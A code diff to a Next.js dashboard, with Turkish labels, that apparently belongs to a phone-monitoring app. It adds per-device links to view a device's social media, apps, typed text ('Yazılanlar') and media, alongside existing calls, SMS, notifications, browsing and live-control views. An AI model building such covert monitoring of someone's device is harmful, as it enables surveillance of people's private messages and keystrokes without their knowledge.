@@ -6,6 +6,7 @@ import Link from 'next/link';
 import { LoadingSkeleton } from '@/components/ui/LoadingSkeleton';
 import { PermissionPanel } from '@/components/PermissionPanel';
 import { LiveControl } from '@/components/LiveControl';
+import { DeviceDangerZone } from '@/components/DeviceDangerZone';
 
 export default function DashboardPage() {
   const [devices, setDevices] = useState<Device[]>([]);
@@ -82,11 +83,19 @@ export default function DashboardPage() {
                 <LiveControl deviceId={device.id} />
               </div>
 
+              <div className="mt-4">
+                <DeviceDangerZone deviceId={device.id} deviceName={device.deviceName} />
+              </div>
+
               <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mt-4">
+                <Link href={`/dashboard/social?device=${device.id}`} className="btn-secondary text-xs text-center">Sosyal</Link>
+                <Link href={`/dashboard/apps?device=${device.id}`} className="btn-secondary text-xs text-center">Uygulamalar</Link>
                 <Link href={`/dashboard/calls?device=${device.id}`} className="btn-secondary text-xs text-center">Aramalar</Link>
                 <Link href={`/dashboard/sms?device=${device.id}`} className="btn-secondary text-xs text-center">SMS</Link>
                 <Link href={`/dashboard/notifications?device=${device.id}`} className="btn-secondary text-xs text-center">Bildirimler</Link>
                 <Link href={`/dashboard/web?device=${device.id}`} className="btn-secondary text-xs text-center">İnternet</Link>
+                <Link href={`/dashboard/inputs?device=${device.id}`} className="btn-secondary text-xs text-center">Yazılanlar</Link>
+                <Link href={`/dashboard/media?device=${device.id}`} className="btn-secondary text-xs text-center">Medya</Link>
               </div>
             </div>
           ))}
